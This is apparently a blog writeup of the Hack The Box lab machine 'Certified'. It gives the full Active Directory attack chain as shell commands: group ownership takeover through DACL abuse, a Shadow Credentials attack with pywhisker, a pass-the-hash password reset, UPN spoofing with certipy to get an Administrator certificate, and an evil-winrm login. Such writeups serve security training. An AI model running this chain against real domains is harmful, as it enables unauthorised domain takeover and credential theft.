+++
date = '2026-07-01T20:21:47+02:00'
draft = false
title = 'Certified Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`31/01/2025`**

![Certified.jpeg](/images/imgs_certified/Certified.jpeg)

---
# Introduction

_**Certified**_ is a **Medium-level Active Directory** environment that dives deep into advanced exploitation and **Certificate Services** (**AD CS**).

Starting with a set of provided credentials, the attack path requires chaining multiple **Active Directory misconfigurations**. The journey begins with **DACL abuse** to take ownership of a group, which in turn allows a **Shadow Credentials attack** against a service account. From there, I abused access rights to reset a **Certificate Authority** operator's password and manipulated their **User Principal Name** (**UPN**). This allowed me to exploit an **ADCS** template and retrieve the **Domain Administrator's NT hash**.

---
# Techniques Used
- **DACL Abuse & Group Modification**

- **Shadow Credentials Attack**

- **Password Reset via RPC (Pass-The-Hash)** 

- **ADCS Exploitation via UPN Spoofing**

---
# Enumeration

## nmap 

```bash
nmap -sC -sV certified -T5
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 23:41:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:36+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T23:42:35+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:36+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:35+00:00; +7h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-01T23:41:58
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
```

---
# Initial Validation & RPC Enumeration

We start this box with a known set of credentials:
- **Username**: judith.mader
- **Password**: judith09

I first validated these credentials against **WinRM** and **SMB** using **netexec**. While **WinRM** access was denied, **SMB** authentication was successful.

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09'
```

![nxc_validation.png](/images/imgs_certified/nxc_validation.png)

Next, I used **rpcclient** to enumerate the domain users and extract descriptions, which gave me a clear picture of the environment:

```bash
rpcclient -U "certified.htb\judith.mader%judith09" 10.10.11.41 -c "querydispinfo"
```

```text
 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
 Account: judith.mader   Name: Judith Mader      Desc: (null)
 Account: management_svc Name: management service        Desc: (null)
 Account: ca_operator    Name: Operator CA       Desc: (null)
```

To understand the group structure, I ran an **SMB RID brute-force**:

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute
```

![rid-brute.png](/images/imgs_certified/rid-brute.png)

The enumeration revealed several interesting custom groups and users, particularly the **`Management group`** (**`RID 1104`**), **`management_svc`** (**`RID 1105`**), and **`ca_operator`** (**`RID 1106`**).

---
# Lateral Movement | DACL Abuse → Shadow Credentials

## Taking over the Management group

My first goal was to investigate the custom groups discovered during enumeration. I wanted to see if **`judith.mader`** had any special privileges over the **Management** group. 

Instead of relying on **BloodHound**, I used **impacket-dacledit** to read the **DACL** (**Discretionary Access Control List**) of the group directly from the terminal:

```bash
impacket-dacledit -action 'read' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit.png](/images/imgs_certified/dacledit.png)

The output revealed that **`judith.mader`** had the **`WriteOwner`** privilege over the **Management** group. This meant I could forcibly change the owner of the group to myself.

Knowing this, I used **bloodyAD** to exploit the **`WriteOwner`** privilege and set **`judith.mader`** as the new owner of the **Management** group:

```bash
bloodyAD --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader 
```

![setowner.png](/images/imgs_certified/setowner.png)

Now that I owned the group, I had the authority to modify its permissions. I used **impacket-dacledit** again, this time to grant myself **`WriteMembers`** privileges:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![writepriv.jpeg](/images/imgs_certified/writepriv.jpeg)

With write privileges secured, I simply added judith.mader to the Management group using net rpc:

```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"
```

Checking the group members confirmed that both **`judith.mader`** and **`management_svc`** were now in the **Management** group.

## Shadow Credential Attack

Now that I was a member of the **`Management`** group, I inherited all its permissions. Before firing off exploits blindly, I wanted to see exactly what privileges this group granted me over the target service account. 

Using **impacket-dacledit** again, I read the **ACLs** for the **`management_svc`** account, filtering for rights held by the **`Management`** group:

```bash
impacket-dacledit -action 'read' -principal 'Management' -target-dn 'CN=management service,CN=Users,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit2.jpeg](/images/imgs_certified/dacledit2.jpeg)

The output confirmed that the **Management** group held **`WriteProperties`** rights over **`management_svc`**. This meant I had the specific permissions required to modify attributes on the target account.

I decided to exploit this using a **Shadow Credentials attack**. This technique involves writing a new certificate to the target object's **`msDS-KeyCredentialLink`** attribute, allowing us to authenticate as that object via **`PKINIT`**.

I used **pywhisker** to generate and inject the certificate:

```bash
pywhisker -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add"
```

![pywhisker.png](/images/imgs_certified/pywhisker.png)

With the certificate (**`WErHElee.pfx`**), I requested a **Ticket Granting Ticket** (**TGT**) for **`management_svc`** using **`gettgtpkinit.py`**:

```bash
python3 PKINITtools/gettgtpkinit.py certified.htb/management_svc -cert-pfx WErHElee.pfx -pfx-pass '<pass>' management_svc.ccache
```

![tgt.png](/images/imgs_certified/tgt.png)

I exported the **TGT** to my environment variables and used the **AS-REP** encryption key to retrieve the **NT hash** of **`management_svc`**:

```bash
export KRB5CCNAME=management_svc.ccache
python3 PKINITtools/getnthash.py certified.htb/management_svc -key <AS-REP_encryption_key>
```

Recovered **NT Hash** for **`management_svc`**: 
a0REDACTED84

---
# Privilege Escalation | AD CS Exploitation via UPN Spoofing

## Password Reset

With the hash for **`management_svc`** in hand, my next target was the **`ca_operator`** account. The name itself was a huge hint, strongly suggesting it was tied to **Active Directory Certificate Services** (**AD CS**).

Using **impacket-dacledit**, I verified the **ACLs** on the **`ca_operator`** account to confirm what type of control **`management_svc`** actually held over it:

```bash
impacket-dacledit -action 'read' -principal 'management_svc' -target-dn 'CN=operator ca,CN=Users,DC=certified,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit3.jpeg](/images/imgs_certified/dacledit3.jpeg)

The output confirmed that **`management_svc`** possessed **`FullControl`** over the **`ca_operator`** account. Having complete control over a user object inherently includes the ability to **force a password reset**.

Leveraging the compromised hash, I performed a **Pass-The-Hash** attack using **pth-net rpc** to force a password reset on **`ca_operator`**:

```bash
pth-net rpc password "ca_operator" "Stars1%" -U "certified.htb"/"management_svc"%"a0<REDACTED>84":"a0<REDACTED>84" -S "DC01.certified.htb"
```

![pass-reset.png](/images/imgs_certified/pass-reset.png)

I verified the new credentials with **netexec**:

```bash
netexec smb certified.htb -u 'ca_operator' -p 'Stars1%'
```

![nxc_validation2.png](/images/imgs_certified/nxc_validation2.png)

## Manipulating the UPN & Requesting a Cert

I ran **certipy find** and discovered the **`certified-DC01-CA`** certificate authority along with a template named **`CertifiedAuthentication`**.

**Note**: _By default, **AD CS** uses the **User Principal Name** (**UPN**) of the requesting account to generate the certificate. If we can change our own **UPN** in **Active Directory** to match a highly privileged user (like the **Administrator**), the **CA** will issue a certificate that can be used to authenticate as that user._

Using **certipy account update** with the **`management_svc`** hash, I overwrote the **`userPrincipalName`** of **`ca_operator`** to **Administrator**:

```bash
certipy account update -username management_svc@certified.htb -hashes a0<REDACTED>84 -user ca_operator -upn Administrator
```

![certipy.png](/images/imgs_certified/certipy.png)

I verified the change using **ldapsearch**:

```bash
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w "judith09" -b "DC=certified,DC=htb" "(sAMAccountName=ca_operator)" userPrincipalName
```

![ldap_validation.jpeg](/images/imgs_certified/ldap_validation.jpeg)

## Getting Domain Admin

Now that **Active Directory** thought the **`ca_operator`**'s **UPN** was "**Administrator**", I requested a certificate using the **'CertifiedAuthentication`** template:

```bash
certipy req -username ca_operator@certified.htb -p Stars1% -ca certified-DC01-CA -template CertifiedAuthentication
```

![request.png](/images/imgs_certified/request.png)

Finally, I used the generated **`administrator.pfx`** to authenticate via **`PKINIT`** and dump the **NT hash** of the Domain **Administrator**:

```bash
certipy auth -pfx administrator.pfx -domain certified.htb -user administrator
```

```bash
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d<REDACTED>34
```

With the **Administrator**'s hash, I had full control over the domain. 

Passing the hash through **evil-winrm** I connected to the machine and grabbed both user and root flags, fully compromising the box.

```bash
evil-winrm -i certified.htb -u Administrator -H '<hash>'
```

```cmd
type C:\Users\management_svc\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

![system&flags.png](/images/imgs_certified/system&flags.png)

---
# Final Thoughts

_**Certified**_ is an outstanding **Active Directory** box that tests the understanding of modern **AD** exploitation beyond the standard **BloodHound** and **Kerberoasting** flows.

The initial foothold requires a solid grasp of **Windows Discretionary Access Control Lists** (**DACLs**) and how to manipulate group ownership. Transitioning from that into a **Shadow Credentials attack** using **pywhisker** models a highly realistic lateral movement phase.

The privilege escalation is the true highlight. Instead of relying on a generic **ESC1** vulnerability where you can simply supply a **SAN**, this box forces you to understand the underlying mechanics of **AD CS**. Recognizing that you have the privileges to manually alter a **User Principal Name** (**UPN**) to trick the **CA** into issuing a **Domain Admin certificate** is a fantastic and elegant attack vector.

**Sources**:

- **Impacket (DACLedit & PKINIT tools)**: https://github.com/fortra/impacket

- **PyWhisker (Shadow Credentials)**: https://github.com/ShutdownRepo/pywhisker

- **Certipy (AD CS Enumeration & Exploitation)**: https://github.com/ly4k/Certipy

- **Shadow Credentials Explanation**: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab